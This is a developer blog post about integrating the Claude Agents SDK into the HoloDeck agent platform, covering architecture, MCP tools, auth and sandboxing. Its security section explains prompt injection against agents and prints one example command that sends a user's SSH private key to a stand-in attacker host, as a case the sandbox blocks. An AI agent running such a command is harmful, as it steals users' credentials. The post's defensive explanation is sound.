---
title: "You Don't Need Any Other Agent Framework, You Only Need Claude Agents SDK"
slug: you-dont-need-another-agent-framework
publishDate: 25 Feb 2026
description: "I built a multi-backend agent platform. Then Claude Agents SDK shipped and I realized it was the only backend I actually needed."
---

# You Don't Need Any Other Agent Framework, You Only Need Claude Agents SDK

I've spent months building [HoloDeck](https://github.com/justinbarias/holodeck) — a no-code agent platform where you define agents, tools, evaluations, and deployments in pure YAML. It supports OpenAI, Azure, Ollama via Semantic Kernel. And as of v0.5.0, it supports Claude Agents SDK as a **first-class backend**.

Now, here's a hot take: after building both backends side by side, I'm convinced Claude Agents SDK is the only agent framework most developers actually need.

If you read my [previous post on bash/filesystem-based agentic systems](https://justinbarias.io/blog/agentic-memory-filesystem-part-1/), you already know I'm a fan of agents that work _with_ your tools, not agents that try to _replace_ them. Claude Agents SDK nails this. It gives you a process with bash, file I/O, MCP tool access, extended thinking, and structured output — out of the box.

---

## Table of Contents

- [Why Claude Agents SDK](#why-claude-agents-sdk)
- [How HoloDeck Runs Claude Under the Hood](#how-holodeck-runs-claude-under-the-hood)
- [The Bridges and Adapters I Built](#the-bridges-and-adapters-i-built)
- [Custom Tools Are Just MCP Servers](#custom-tools-are-just-mcp-servers)
- [What's Supported Today](#whats-supported-today)
- [Security: Sandboxing and Secure Deployment](#security-sandboxing-and-secure-deployment)
- [Using Claude Agents SDK Without an Anthropic API Key](#using-claude-agents-sdk-without-an-anthropic-api-key)
- [Auth: Local Experimentation vs Production](#auth-local-experimentation-vs-production)
- [What's Coming Next](#whats-coming-next)
- [Wrapping Up](#wrapping-up)

---

## Why Claude Agents SDK

Most agent frameworks give you a library. You import classes, wire up chains, manage state, and pray that your tool-calling loop doesn't hit an edge case.

Claude Agents SDK gives you a **process**. An actual subprocess that:

- Has bash access (configurable, with excluded commands)
- Can read, write, and edit files
- Runs MCP tools natively
- Supports extended thinking (deep reasoning with token budgets)
- Returns structured output validated against JSON schemas
- Manages multi-turn sessions with conversation continuity
- Supports subagents for parallel task execution

This isn't "here's an LLM wrapper with tool use." This is "here's an autonomous coding agent you can point at any problem." The same engine that powers Claude Code, now available as an SDK.

In my [previous post](https://justinbarias.io/blog/agentic-memory-filesystem-part-1/), I talked about how bash + filesystem is the real agentic memory layer — not some vector database, not some custom state manager. Claude Agents SDK is the natural evolution of that idea. The agent _is_ a process. Its memory _is_ the filesystem. Its tools _are_ MCP servers.

---

## How HoloDeck Runs Claude Under the Hood

HoloDeck doesn't wrap Claude in some brittle API adapter. It spawns the Claude Agent SDK as a **separate Node.js subprocess**, then communicates via a structured message protocol. Think of it like running a very smart CLI tool — you send a prompt in, you get structured messages back.

Here's the architecture:

```
┌──────────────────────────────────────────────────────────────────┐
│                    HoloDeck (Python process)                     │
│                                                                  │
│ ┌───────────────┐  ┌───────────────┐  ┌─────────────────────┐    │
│ │ holodeck test │  │ holodeck chat │  │ holodeck serve (SK) │    │
│ │  (TestExec)   │  │  (ChatSess)   │  │   (future Claude)   │    │
│ └───────────────┘  └───────────────┘  └─────────────────────┘    │
│        │                │                                        │
│        ▼                ▼                                        │
│ ┌─────────────────────────────────────────────────────┐          │
│ │                   BackendSelector                   │          │
│ │ provider: anthropic ────────────────► ClaudeBackend │          │
│ │ provider: openai / azure / ollama ──► SKBackend     │          │
│ └─────────────────────────────────────────────────────┘          │
│                         │                                        │
│                         ▼                                        │
│ ┌──────────────────────────────────────────────────────────────┐ │
│ │                   ClaudeBackend                              │ │
│ │                                                              │ │
│ │ ┌───────────────┐  ┌─────────────┐  ┌──────────────────────┐ │ │
│ │ │ Tool Adapters │  │ MCP Bridge  │  │    OTel Bridge       │ │ │
│ │ │ (in-process   │  │ (external   │  │ (env var translator) │ │ │
│ │ │  MCP server)  │  │  MCP stdio) │  │                      │ │ │
│ │ └───────────────┘  └─────────────┘  └──────────────────────┘ │ │
│ │        │                │                                    │ │
│ │        ▼                ▼                                    │ │
│ │ ┌────────────────────────────────────────────────────┐       │ │
│ │ │ ClaudeAgentOptions                                 │       │ │
│ │ │ {model, system_prompt, mcp_servers, env,           │       │ │
│ │ │  permission_mode, max_turns, allowed_tools, ...}   │       │ │
│ │ └────────────────────────────────────────────────────┘       │ │
│ └──────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────┘
                              │
           stdin: AsyncGenerator[prompt]
           stdout: AssistantMessage | UserMessage | ResultMessage
                              │
                              ▼
┌────────────────────────────────────────────────────────┐
│        Claude Agent SDK (Node.js subprocess)           │
│                                                        │
│ ┌────────────────────────────────────────────────────┐ │
│ │ Claude Model (sonnet, opus, haiku, etc.)           │ │
│ │                                                    │ │
│ │ Tools:                                             │ │
│ │  ├── holodeck_tools (in-process MCP server)        │ │
│ │  │    ├── vectorstore_search                       │ │
│ │  │    └── hierarchical_doc_search                  │ │
│ │  ├── external MCP servers (stdio transport)        │ │
│ │  ├── bash (configurable, with excluded commands)   │ │
│ │  ├── file read/write/edit (toggleable)             │ │
│ │  └── web search (optional)                         │ │
│ └────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────┘
```

The key insight: **the Claude subprocess manages its own tool loop**. HoloDeck doesn't manually orchestrate "call LLM → parse tool call → execute tool → feed result back." The SDK does all of that internally. HoloDeck's job is to:

1. Assemble the right configuration (tools, auth, observability, system prompt)
2. Send the prompt in
3. Collect the structured results coming back

This is fundamentally simpler than the Semantic Kernel path where you have to manage `ChatHistory`, tool plugins, function call routing, and all the plumbing yourself.

---

## The Bridges and Adapters I Built

To make HoloDeck's existing tools and infrastructure work seamlessly with Claude Agents SDK, I built three bridge layers.

### Tool Adapters (`tool_adapters.py`)

HoloDeck has rich tool implementations — `VectorStoreTool` for semantic search, `HierarchicalDocumentTool` for structure-aware document retrieval with contextual embeddings, hierarchy tracking, and hybrid search. These are Python objects with initialized connections to vector databases, embedding models, and keyword indexes.

The tool adapters wrap these live Python tool instances as an **in-process MCP server** that the Claude subprocess can invoke. Each adapter creates `@tool`-decorated handler functions with proper JSON schemas, then bundles them into a `McpSdkServerConfig`.

```
VectorStoreTool (Python, initialized with vector DB connection)
        │
        ▼
VectorStoreToolAdapter.to_sdk_tool()
        │
        ▼
@tool("vectorstore_search", schema={...})
async def search(query: str, top_k: int) -> str:
    return await tool_instance.search(query, top_k)
        │
        ▼
build_holodeck_sdk_server()
        │
        ▼
McpSdkServerConfig(name="holodeck_tools", tools=[...])
        │
        ▼
Registered as mcp_servers["holodeck_tools"] in ClaudeAgentOptions
```

One subtle but critical detail I had to figure out: the prompt must be sent as an `AsyncGenerator` — not a plain string — to keep stdin open for bidirectional MCP communication. A string prompt closes stdin immediately, which kills the in-process MCP server's ability to respond. I learned this the hard way after debugging a `ProcessTransport` error for way too long.

### MCP Bridge (`mcp_bridge.py`)

HoloDeck users configure external MCP tools in YAML — database servers, API connectors, custom tooling, whatever. The MCP bridge translates HoloDeck's `MCPTool` config format into the `McpStdioServerConfig` TypedDicts that Claude Agents SDK expects.

It handles:
- **Three-level env var resolution:** process env → `.env` file → explicit YAML overrides
- **`${VAR}` substitution** in config values
- **JSON config blobs** serialized into `MCP_CONFIG` env var for complex tool configuration
- **Transport filtering** — Claude subprocess only supports stdio, so SSE/WebSocket/HTTP tools are skipped with a warning

### OTel Bridge (`otel_bridge.py`)

HoloDeck has a comprehensive `ObservabilityConfig` Pydantic model for OpenTelemetry — traces, metrics, logs, the works. But the Claude subprocess runs as a separate process, so you can't pass spans or meters across the process boundary. The bridge translates the config into environment variables that the subprocess reads:

| HoloDeck Config | Subprocess Env Var |
|---|---|
| `exporters.otlp.endpoint` | `OTEL_EXPORTER_OTLP_ENDPOINT` |
| `exporters.otlp.protocol` | `OTEL_EXPORTER_OTLP_PROTOCOL` |
| `traces.capture_content` | `OTEL_LOG_USER_PROMPTS` + `OTEL_LOG_TOOL_DETAILS` |
| `metrics.export_interval_ms` | `OTEL_METRIC_EXPORT_INTERVAL` |
| `metrics.enabled` | `OTEL_METRICS_EXPORTER` (`"otlp"` or `"none"`) |

Privacy is default-safe — content capture is off unless explicitly enabled. Your prompts and tool details stay private by default.

---

## Custom Tools Are Just MCP Servers

This is where the elegance of Claude Agents SDK really shines. When you build [custom tools for the SDK](https://platform.claude.com/docs/en/agent-sdk/custom-tools), you're not learning some proprietary plugin API. You're building an MCP server.

That's it. Your tool is an MCP server. Claude knows how to call MCP servers. The tool gets a name, a JSON schema for its inputs, and a handler function. The SDK packages it as an internal MCP server that the Claude subprocess communicates with via the standard MCP protocol.

```python
from claude_agent_sdk import tool, create_sdk_mcp_server

@tool(name="search_docs", description="Search documentation", schema={...})
async def search_docs(query: str, top_k: int = 5) -> str:
    results = await my_search_engine.search(query, top_k)
    return format_results(results)

server = create_sdk_mcp_server(name="my_tools", tools=[search_docs])
```

This means:
- **Tools are testable in isolation** — they're just functions
- **Tools are reusable** — any MCP client can call them
- **Tools compose naturally** — multiple servers, each with their own tools
- **No framework lock-in** — MCP is an open protocol

Compare this to Semantic Kernel where you need to create a `KernelPlugin`, register it with the kernel, handle the `FunctionCallContent` types, and manage the invocation lifecycle yourself. With Claude Agents SDK, you decorate a function and you're done.

---

## What's Supported Today

As of HoloDeck v0.5.0, here's what works with `provider: anthropic`:

### Core Features

- **`holodeck test`** — Run your eval suite against Claude agents. Each test case is a stateless `invoke_once()` call with full evaluation metrics (BLEU, ROUGE, G-Eval, RAG faithfulness, etc.)
- **`holodeck chat`** — Interactive multi-turn chat with streaming. Token-by-token output with a spinner until the first chunk arrives. Session continuity via `session_id`.
- **HoloDeck tools as native Claude SDK tools** — VectorStoreTool and HierarchicalDocumentTool work seamlessly through the in-process MCP adapter. The agent calls them just like any other tool.
- **Structured outputs** — Configure a JSON schema (inline or file path) and the response is validated at startup _and_ at inference time. Invalid schemas fail fast.
- **Custom system prompts** — Your `instructions` (file or inline) become the Claude subprocess's `system_prompt`. Full control over agent behavior.
- **OpenTelemetry** — Full observability pipeline. Traces, metrics, and logs forwarded to your OTLP collector through the OTel bridge.
- **OAuth token auth** — Use `auth_provider: oauth_token` for local development with your Claude Code credentials.

### Claude-Specific Capabilities

- Extended thinking with configurable token budgets (1,000-100,000 tokens)
- Built-in web search
- Bash execution with excluded command lists
- File system access (read/write/edit individually toggleable)
- Subagent execution (1-16 parallel)
- Permission modes (`manual`, `acceptEdits`, `acceptAll`)
- Max turns limit with automatic detection
- 5 auth providers: `api_key`, `oauth_token`, `bedrock`, `vertex`, `foundry`

---

## Security: Sandboxing and Secure Deployment

Here's the part where most "just use the API" agent frameworks hand-wave. Claude Agents SDK actually ships with serious, layered security — and if you're running agents that can execute bash commands and write files, you _need_ this.

### The Threat Model

Agents aren't traditional software that follows predetermined code paths. They generate actions dynamically based on context. That means they can be influenced by the content they process — files, web pages, user input. This is prompt injection, and it's a real risk when your agent has bash and file access.

The good news: Claude's latest models are [among the most robust frontier models](https://assets.anthropic.com/m/64823ba7485345a7/Claude-Opus-4-5-System-Card.pdf) against prompt injection. But defense in depth is still good practice.

### Built-in Sandboxing

Claude Agents SDK includes a [sandboxed bash tool](https://code.claude.com/docs/en/sandboxing) that enforces OS-level isolation — not just "we check the command string," but actual kernel-level enforcement:

- **macOS**: Uses Apple's Seatbelt framework
- **Linux**: Uses [bubblewrap](https://github.com/containers/bubblewrap) for namespace-based isolation
- **Windows (WSL2)**: Uses bubblewrap, same as Linux. WSL1 is _not_ supported (requires kernel features only available in WSL2). Native Windows sandboxing is planned but not yet available.
- **Network isolation**: All network access goes through a proxy — domain allowlists, not blocklists

```
┌─────────────────────────────────────────────────┐
│               Agent Sandbox                     │
│                                                 │
│ ┌─────────────────┐  ┌────────────────────────┐ │
│ │ Filesystem      │  │ Network (proxy-gated)  │ │
│ │ • CWD: r/w      │  │ • Only allowed domains │ │
│ │ • Rest: r/o     │  │ • All traffic proxied  │ │
│ │ • Denied dirs   │  │ • No direct egress     │ │
│ └─────────────────┘  └────────────────────────┘ │
│                                                 │
│ OS-level enforcement (Seatbelt / bubblewrap)    │
│ All child processes inherit restrictions        │
└─────────────────────────────────────────────────┘
```

This means even if an attacker successfully injects a prompt that tricks the agent into running `curl evil.com/exfil?data=$(cat ~/.ssh/id_rsa)`, the network proxy blocks it. The agent literally cannot reach domains that aren't on the allowlist.

### Configuring the Sandbox Programmatically

The SDK exposes all of this as a `SandboxSettings` TypedDict you can pass directly in your agent options:

```python
from claude_code_sdk import SandboxSettings

sandbox_settings: SandboxSettings = {
    "enabled": True,
    # Auto-approve bash commands when sandboxed — no more approval fatigue
    "autoAllowBashIfSandboxed": True,
    # Commands that must run outside the sandbox (they use the normal permission flow)
    "excludedCommands": ["docker", "git push"],
    # Block the escape hatch — all commands MUST run sandboxed
    "allowUnsandboxedCommands": False,
    "network": {
        # Only these Unix sockets are accessible
        "allowUnixSockets": ["/var/run/docker.sock"],
        # Allow binding to localhost ports (for dev servers, etc.)
        "allowLocalBinding": True
    },
    # For running inside unprivileged Docker (weaker security, use with caution)
    "enableWeakerNestedSandbox": False,
}
```

The key fields:

| Field | Default | What it does |
|---|---|---|
| `enabled` | `False` | Turn on OS-level bash sandboxing |
| `autoAllowBashIfSandboxed` | `True` | Skip permission prompts for sandboxed commands |
| `excludedCommands` | `[]` | Commands that run outside the sandbox (e.g., `docker`, `git`) |
| `allowUnsandboxedCommands` | `True` | Allow `dangerouslyDisableSandbox` escape hatch. Set to `False` for strict mode. |
| `network.allowUnixSockets` | `[]` | Unix sockets accessible from within the sandbox |
| `network.allowLocalBinding` | `False` | Allow processes to bind to localhost ports |
| `enableWeakerNestedSandbox` | `False` | Linux-only: weaker sandbox for unprivileged Docker. Reduces security significantly. |

The `autoAllowBashIfSandboxed` flag is particularly nice for CI/CD and automated testing. Instead of the agent asking for permission on every `ls`, `grep`, and `cat`, sandboxed commands just run. But if the command tries to reach a blocked domain or write outside the sandbox, it fails at the OS level — no prompt needed, just a hard block.

Setting `allowUnsandboxedCommands: False` is the strict mode. It completely disables the `dangerouslyDisableSandbox` escape hatch, forcing every bash command to run inside the sandbox. Combined with `excludedCommands` for the handful of tools that genuinely can't be sandboxed (like Docker), this gives you a tight security posture.

### Production Hardening

For production deployments, Anthropic's [secure deployment guide](https://platform.claude.com/docs/en/agent-sdk/secure-deployment) lays out a serious defense-in-depth strategy:

**Container isolation with zero network:**

```bash
docker run \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  --read-only \
  --network none \
  --memory 2g \
  --pids-limit 100 \
  --user 1000:1000 \
  -v /path/to/code:/workspace:ro \
  -v /var/run/proxy.sock:/var/run/proxy.sock:ro \
  agent-image
```

The `--network none` flag removes _all_ network interfaces. The only way out is through a Unix socket connected to a proxy running on the host. That proxy enforces domain allowlists, injects credentials, and logs everything.

**The proxy pattern for credentials** is particularly elegant. Instead of giving the agent an API key, you run a proxy outside the agent's security boundary that injects credentials into outgoing requests. The agent makes requests without credentials → the proxy adds them → forwards to the destination. The agent never sees the actual secrets.

**Isolation technology options:**

| Technology | Isolation Strength | Overhead | Use Case |
|---|---|---|---|
| Sandbox runtime | Good | Very low | Local dev, CI/CD |
| Docker + `--network none` | Setup dependent | Low | Standard deployment |
| gVisor (`runsc`) | Excellent | Medium-High | Multi-tenant, untrusted content |
| Firecracker VMs | Excellent | High | Maximum isolation |

### What HoloDeck Does Today

HoloDeck's `ClaudeBackend` already implements several security practices:

- **Pre-flight validators** catch misconfigurations before the subprocess starts (missing Node.js, invalid credentials, embedding provider mismatches, working directory collisions with existing `CLAUDE.md` files)
- **Credential injection** via subprocess env vars — auth tokens are scoped to the subprocess, not global
- **Permission mode mapping** — `acceptEdits` and `acceptAll` are escalated to `bypassPermissions` only in `test` mode (non-interactive automation). In `chat` mode, the configured permission level is respected.
- **Tool allowlists** via `claude.allowed_tools` — explicitly restrict which MCP tools the agent can invoke

The sandboxing and proxy patterns from the SDK docs will naturally compose with HoloDeck's deployment pipeline (`holodeck deploy`) once we add Claude backend support to `holodeck serve`.

---

## Using Claude Agents SDK Without an Anthropic API Key

Here's something most people don't realize: the Claude Agents SDK doesn't _have_ to talk to Anthropic's servers. It speaks the Anthropic API protocol, and any endpoint that implements that protocol works. Ollama does exactly this — it exposes an **Anthropic-compatible** endpoint that the SDK can talk to natively.

As documented in the [Ollama integration guide](https://docs.ollama.com/integrations/claude-code), you can point the SDK at a local Ollama instance by setting `ANTHROPIC_BASE_URL`:

```bash
export ANTHROPIC_BASE_URL=http://localhost:11434
```

To be clear: the SDK does **not** support OpenAI-compatible endpoints. It speaks the Anthropic Messages API. Ollama works because Ollama implemented the Anthropic API format on their side. Any provider that does the same (or any proxy that translates to it) will work too.

This means you can experiment with the Claude Agents SDK tooling, MCP integration, and agent patterns using local models — completely free, completely offline. The SDK's tool-calling loop, structured output, and session management all work the same way regardless of what's behind the endpoint.

Obviously you won't get Claude-level reasoning from a local 7B model, but for testing tool integration, MCP server development, and agent workflow design, it's perfectly usable.

---

## Auth: Local Experimentation vs Production

One of the friction points with agent SDKs is authentication. Claude Agents SDK makes this surprisingly painless for local development.

As [Thariq pointed out on X](https://x.com/trq212/status/2024212378402095389?s=20), using your `CLAUDE_CODE_OAUTH_TOKEN` for local experimentation is actually allowed. This means if you have Claude Code installed and authenticated, you can build and test custom agents without setting up a separate API key.

In HoloDeck, this is a simple YAML toggle:

```yaml
model:
  provider: anthropic
  name: claude-sonnet-4-20250514
  auth_provider: oauth_token  # Uses CLAUDE_CODE_OAUTH_TOKEN
```

**However** — and this is important — **when you ship these agents to production, you must use an Anthropic API key.** The OAuth token is tied to your personal Claude Code session. It's not meant for server-side deployment.

For production:

```yaml
model:
  provider: anthropic
  name: claude-sonnet-4-20250514
  auth_provider: api_key  # Uses ANTHROPIC_API_KEY
```

Or if you're running through a cloud provider:

```yaml
model:
  provider: anthropic
  name: claude-sonnet-4-20250514
  auth_provider: bedrock  # or vertex, foundry
```

HoloDeck's validators check for the right credentials at startup and inject them into the subprocess environment, so you get a clear error if something's misconfigured rather than a cryptic 401 at inference time.

---

## What's Coming Next

HoloDeck v0.5.0 is the foundation. Here's what we're building on top of it:

### Hooks

Claude Agents SDK supports [hooks](https://docs.anthropic.com/en/docs/agents-and-tools/claude-code/hooks) — shell commands that execute in response to agent events (tool calls, message sends, etc.). We'll expose these as YAML config so you can add pre/post processing, logging, or validation to any agent action without writing code.

### Agent Skills

Skills are reusable prompt-based capabilities that can be invoked by name. Think of them as composable building blocks — a "summarize" skill, a "code-review" skill, a "translate" skill — that agents can mix and match.

### Subagents (Multi-Agent Swarms)

The SDK already supports parallel subagent execution. We'll expose this as a YAML pattern where you define a coordinator agent that spawns specialized worker agents. Swarm-style orchestration, configured in YAML.

### `holodeck serve` for Claude Agents

Right now, `holodeck serve` only works with Semantic Kernel backends. We're adding Claude agent support so you can expose any `provider: anthropic` agent as an HTTP API endpoint — same REST interface, same AG-UI compliance.

### `holodeck deploy` with Claude

Once `serve` supports Claude, `deploy` naturally follows. The deployment pipeline (Dockerfile generation, container build, cloud push) will use `serve` as the entrypoint into the container. You just swap the provider in your YAML and the container runs a Claude agent instead of an SK agent — with all the security hardening options from the SDK baked in.

### Human-in-the-Loop Approvals

By combining `permission_mode: manual` (or `acceptEdits`) with hooks, you can build approval workflows where the agent pauses and waits for human confirmation before taking sensitive actions. Think: "the agent wants to run `DELETE FROM users` — approve or deny?"

### Custom Anthropic Endpoints

Full support for routing through cloud providers — AWS Bedrock, Google Vertex AI, Azure Foundry — plus custom `ANTHROPIC_BASE_URL` for self-hosted endpoints and Ollama. Run the same agent YAML against any compatible backend.

---

## Wrapping Up

I started building HoloDeck as a multi-backend platform because I thought you needed choice. And you do — for the transition period. But after building the Claude Agents SDK integration, I'm increasingly convinced it's the only agent runtime most teams need.

It's a process, not a library. It manages its own tool loop. It speaks MCP natively. It has bash, file I/O, extended thinking, structured output, and subagents built in. It ships with real sandboxing — OS-level enforcement, not just string matching on commands. And you can [run it locally with Ollama](https://docs.ollama.com/integrations/claude-code) if you want to experiment without an API key.

The Semantic Kernel backend isn't going anywhere — it powers OpenAI and Azure workloads and that's still valuable. But for new agents? I'd start with Claude Agents SDK every time.

If you're building agents today, stop gluing together LangChain chains or wrestling with AutoGen graphs. Just define your agent in YAML, point it at Claude, and let the SDK do what it does best.

```yaml
name: my-agent
model:
  provider: anthropic
  name: claude-sonnet-4-20250514
  auth_provider: oauth_token
instructions:
  inline: "You are a helpful assistant."
claude:
  bash:
    enabled: true
  file_system:
    read: true
    write: true
  max_turns: 10
```

That's it. That's the whole framework.

---

*Check out [HoloDeck on GitHub](https://github.com/justinbarias/holodeck) and the [Claude Agent SDK docs](https://platform.claude.com/docs/en/agent-sdk/overview) to get started.*
